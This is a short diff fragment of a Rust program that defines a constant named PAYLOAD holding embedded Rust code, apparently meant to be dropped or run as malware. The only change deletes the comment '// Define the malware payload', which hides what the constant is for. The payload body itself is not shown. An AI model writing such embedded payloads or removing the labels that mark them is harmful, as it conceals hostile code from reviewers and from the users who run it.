@@ -5,7 +5,6 @@ use std::process::Command;
 use rand::Rng;
 use std::io::{self, Write};
 
-// Define the malware payload
 const PAYLOAD: &str = r#"
 use std::env;
 use std::fs;
